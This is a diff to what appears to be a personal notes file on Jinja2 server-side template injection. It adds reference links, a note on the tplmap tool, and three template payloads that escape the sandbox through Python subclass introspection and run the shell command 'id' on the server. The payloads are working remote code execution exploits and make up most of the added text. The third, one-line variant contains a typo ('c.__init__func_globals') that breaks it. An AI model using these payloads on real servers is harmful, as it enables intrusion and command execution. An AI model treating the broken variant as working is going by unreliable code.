@@ -6,4 +6,25 @@ https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/
 http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/
 
 # detection and exploitation
-https://github.com/epinna/tplmap
+https://github.com/epinna/tplmap - 0.5 tag runs fine on python2
+
+#
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+{{ c.__init__.func_globals['linecache'].__dict__['os'].system('id') }}
+{% endif %}
+{% endfor %}
+
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.func_globals.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__("os").popen("id").read()') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__func_globals.values() %}{% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__("os").popen("id").read()') }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}
